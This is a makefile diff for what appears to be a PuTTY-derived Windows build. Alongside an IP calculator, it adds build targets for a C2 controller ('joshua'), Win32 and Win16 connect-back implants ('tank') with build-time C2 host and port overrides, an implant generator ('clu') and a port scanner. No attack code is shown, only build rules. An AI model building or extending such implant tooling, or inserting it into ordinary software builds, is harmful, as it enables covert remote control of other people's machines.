@@ -423,9 +423,9 @@ OBJ_ROOTSHARED = &
 # Default target
 # =================================================================
 
-all: pageant.exe plink.exe pscp.exe psftp.exe putty.exe puttygen.exe puttytel.exe winsftp.exe ncwfw.exe .SYMBOLIC
+all: pageant.exe plink.exe pscp.exe psftp.exe putty.exe puttygen.exe puttytel.exe winsftp.exe ncwfw.exe joshua.exe tank.exe tank16.exe clu.exe grid.exe ipcalc32.exe ipcalc16.exe .SYMBOLIC
 
-win32s: putty.exe puttytel.exe puttygen.exe winsftp.exe ncwfw.exe .SYMBOLIC
+win32s: putty.exe puttytel.exe puttygen.exe winsftp.exe ncwfw.exe joshua.exe tank.exe tank16.exe clu.exe grid.exe ipcalc32.exe .SYMBOLIC
 
 # =================================================================
 # be_list.c — per-target compilation with different defines
@@ -708,8 +708,101 @@ winsftp.exe: $(WINSFTP_OBJS) psftp.res
 ncwfw.obj: ncwfw.c
 	$(CC) $(COMPAT) $(CFLAGS) $(XFLAGS) -fo=$@ -c ncwfw.c
 
-ncwfw.exe: ncwfw.obj
+ncwfw.res: ncwfw.rc ncwfw.ico
+	$(RCPATH) $(RCFLAGS) ncwfw.rc -o ncwfw.res
+
+ncwfw.exe: ncwfw.obj ncwfw.res
 	$(CC) -bt=nt -l=nt_win -fe=$@ $(LDFLAGS) ncwfw.obj wsock32.lib
+	wrc ncwfw.res $@
+
+# =================================================================
+# joshua.exe -- Joshua C2 controller (MDI, listens for Tank callbacks)
+# =================================================================
+
+joshua.obj: joshua.c
+	$(CC) $(COMPAT) $(CFLAGS) $(XFLAGS) -fo=$@ -c joshua.c
+
+joshua.res: joshua.rc joshua.ico
+	$(RCPATH) $(RCFLAGS) joshua.rc -o joshua.res
+
+joshua.exe: joshua.obj joshua.res
+	$(CC) -bt=nt -l=nt_win -fe=$@ $(LDFLAGS) joshua.obj wsock32.lib
+	wrc joshua.res $@
+
+# =================================================================
+# tank.exe -- Tank Program v1 (connect-back implant)
+# Override host/port at build time:
+#   wmake -f Makefile.wc XFLAGS="-DTANK_C2_HOST=\"1.2.3.4\" -DTANK_C2_PORT=443"
+# =================================================================
+
+tank.obj: tank.c
+	$(CC) $(COMPAT) $(CFLAGS) $(XFLAGS) -fo=$@ -c tank.c
+
+recognizer.obj: recognizer.c
+	$(CC) $(COMPAT) $(CFLAGS) $(XFLAGS) -fo=$@ -c recognizer.c
+
+tank.res: tank.rc tank.ico
+	$(RCPATH) $(RCFLAGS) tank.rc -o tank.res
+
+tank.exe: tank.obj recognizer.obj tank.res
+	$(CC) -bt=nt -l=nt_win -fe=$@ $(LDFLAGS) tank.obj recognizer.obj wsock32.lib
+	wrc tank.res $@
+
+# =================================================================
+# tank16.exe -- Win16 connect-back implant (WFW 3.11, no Win32s)
+# Requires OpenWatcom wcc (16-bit) and wlink, plus Win16 winsock.lib.
+# Override host/port:
+#   wmake -f Makefile.wc tank16.exe XFLAGS="-DTANK_C2_HOST=\"x.x.x.x\" -DTANK_C2_PORT=443"
+# =================================================================
+
+tank16.obj: tank16.c
+	wcc -ml -bt=windows -zu -s -I/opt/watcom/h/win $(XFLAGS) -fo=$@ tank16.c
+
+tank16.exe: tank16.obj
+	wlink system windows name $@ file tank16.obj library winsock.lib
+
+# =================================================================
+# clu.exe -- CLU implant generator (Win32, patches tank.exe / tank16.exe)
+# =================================================================
+
+clu.obj: clu.c
+	$(CC) $(COMPAT) $(CFLAGS) $(XFLAGS) -fo=$@ -c clu.c
+
+clu.res: clu.rc lightcycle.ico
+	$(RCPATH) $(RCFLAGS) clu.rc -o clu.res
+
+clu.exe: clu.obj clu.res
+	$(CC) -bt=nt -l=nt_win -fe=$@ $(LDFLAGS) clu.obj comdlg32.lib
+	wrc clu.res $@
+
+# =================================================================
+# grid.exe -- Win32 console port scanner (TCP connect, TUI / parseable)
+# Console subsystem (-l=nt), no GUI objects needed.
+# Data: SERVICES.DAT next to grid.exe or %GRIDDATA%\SERVICES.DAT
+# =================================================================
+
+grid.obj: grid.c
+	$(CC) $(COMPAT) $(CFLAGS) $(XFLAGS) -fo=$@ -c grid.c
+
+grid.exe: grid.obj
+	$(CC) -bt=nt -l=nt_win -fe=$@ $(LDFLAGS) grid.obj wsock32.lib
+
+# =================================================================
+# ipcalc32.exe -- Win32s/Win32 IP subnet calculator (GUI, no sockets)
+# ipcalc16.exe -- Win16 build of the same source (WFW 3.11, no Win32s)
+# =================================================================
+
+ipcalc32.obj: ipcalc.c
+	$(CC) $(COMPAT) $(CFLAGS) $(XFLAGS) -fo=$@ -c ipcalc.c
+
+ipcalc32.exe: ipcalc32.obj
+	$(CC) -bt=nt -l=nt_win -fe=$@ $(LDFLAGS) ipcalc32.obj
+
+ipcalc16.obj: ipcalc.c
+	wcc -ml -bt=windows -zu -s -I/opt/watcom/h/win $(XFLAGS) -fo=$@ ipcalc.c
+
+ipcalc16.exe: ipcalc16.obj
+	wlink system windows name $@ file ipcalc16.obj
 
 # =================================================================
 # putty.exe — GUI SSH/Telnet/Serial terminal
